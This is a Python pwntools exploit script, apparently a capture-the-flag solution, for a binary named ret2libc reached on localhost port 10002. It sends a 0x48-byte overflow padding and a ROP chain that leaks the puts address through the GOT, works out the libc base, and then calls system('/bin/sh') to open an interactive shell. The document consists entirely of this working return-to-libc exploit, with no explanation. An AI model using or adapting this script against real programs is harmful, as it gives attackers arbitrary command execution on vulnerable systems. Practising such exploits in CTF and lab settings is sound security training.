#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
if debug == 1:
    p = process('./ret2libc')
else:
    p = remote('localhost', 10002)
elf = ELF('./ret2libc', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
rop_1 = 0x0000000000400753 #  pop rdi ; ret
addr_main = 0x400666


pd = 'a' * 0x48
pd += p64(rop_1)
pd += p64(got_puts)
pd += p64(plt_puts)
pd += p64(addr_main)
p.sendafter('get flag\n', pd)
p.recvuntil('Thank you!\n')

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr_puts - libc.sym['puts']
addr_system = libcbase + libc.sym['system']
addr_bin_sh = libcbase + libc.search('/bin/sh').next()

pd = 'a' * 0x48
pd += p64(rop_1)
pd += p64(addr_bin_sh)
pd += p64(addr_system)
p.sendafter('get flag\n', pd)
p.recvuntil('Thank you!\n')
p.interactive()


